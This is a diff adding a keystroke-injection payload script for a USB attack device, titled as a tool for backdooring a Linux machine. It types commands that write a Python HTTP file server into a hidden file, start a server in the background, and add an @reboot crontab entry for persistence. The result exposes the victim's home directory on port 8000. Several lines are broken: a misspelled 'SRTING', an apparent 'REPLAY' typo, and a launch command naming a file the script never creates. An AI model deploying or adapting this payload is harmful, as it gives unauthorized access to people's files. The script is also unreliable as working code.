@@ -1,0 +1,54 @@
+REM Author:ControL
+REM Version: 0.9
+REM Description : Backdorring linux machine (at the time) over http://(+IP):(Port)
+REM Description : The default port is 8000
+
+DELAY 1000
+
+CTRL ALT t 
+DELAY 1500
+STRING clear
+DELAY 15
+ENTER
+STRING touch .profoles
+DELAY 20
+ENTER
+STRING echo "import SimpleHTTPServer" >> .profoles
+DELAY 20
+ENTER
+STRING echo "import SocketServer" >> .profoles
+DELAY 20
+ENTER
+STRING echo "PORT = 8000" >> .profoles
+DELAY 20
+ENTER
+STRING echo "Handler = SimpleHTTPServer.SimpleHTTPRequestHandler" >> .profoles
+DELAY 20
+ENTER
+STRING echo "httpd = SocketServer.TCPServer(('', PORT), Handler)" >> .profoles
+DELAY 20
+ENTER
+STRING echo "httpd.serve_forever()" >> .profoles
+DELAY 100
+ENTER
+STRING  nohup python serverhost.py &
+DELAY 20
+ENTER
+STRING crontab -e 
+DELAY 30
+ENTER 
+SRTING 2
+ENTER
+LEFTARROW
+STRING #
+DELAY 10
+ENTER
+DOWNARROW
+REPLAY 40
+STRING @reboot ~/python .profoles &
+CTRL x 
+DELAY 15
+STRING y
+DELAY 10
+ENTER
+ALT F4 
